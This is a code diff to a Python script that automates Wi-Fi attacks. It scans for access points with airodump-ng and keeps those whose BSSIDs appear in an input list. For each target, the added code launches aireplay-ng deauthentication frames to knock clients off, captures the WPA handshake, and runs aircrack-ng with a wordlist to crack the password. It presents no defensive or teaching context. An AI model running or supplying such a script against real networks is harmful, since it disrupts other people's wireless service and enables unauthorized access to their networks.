@@ -9,6 +9,7 @@ import time
 import csv
 import pandas as pd
 
+
 if os.path.exists('output.txt'):
   os.remove('output.txt')
 
@@ -36,6 +37,7 @@ for line in f:
       interfacemon = word
       print(interfacemon)
 
+
 order = f"airodump-ng {interfacemon} -M -w myOutput --output-format csv & sleep 20; kill $!"
 geny = os.system(order)
 print("****************1***************************")
@@ -45,16 +47,34 @@ print("****************5***************************")
 in_file1= pd.read_csv("myOutput-01.csv",sep=r'\s*,\s*',header=0, engine='python')
 outputCSV= in_file1.copy()
 print("****************6***************************")
+cmd  = os.system("clear")
 inBSSID = list(inputCSV["BSSID"])
 outBSSID = list(outputCSV["BSSID"])
 print("******************2*************************")
-print("list len ",len(outBSSID))
+print("outlist len ",len(outBSSID))
 print("*******************3************************")
+writer = []
+i = 1
 for item in outBSSID:
-    if item in inBSSID:
+    if item in inBSSID:   
         filter = outputCSV["BSSID"]==item
         ch = int(outputCSV[filter]["channel"])
-        print(item + ": ",ch)
+        print(item + " : ",ch)
         print("***************4****************************")
+        writer.append([item,ch])
+        dist=10
+        scan = "catfile"
+        path = scan+"-0"+str(i)+".cap"
+        wordlist = "wordlist.txt"
+        order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {} & sleep 2; kill $!".format(interfacemon,item,ch,scan,dist,item,interfacemon)
+        geny = os.system(order)
+        orders = ("aircrack-ng {} -w {}").format(path,wordlist)
+        genyy = os.system(orders)
+        i+=1
+
     else: 
       print(item," : bulunamadi")
+
+with open('output2.csv', 'w', newline='') as file:
+  wr = csv.writer(file)
+  wr.writerow(writer)
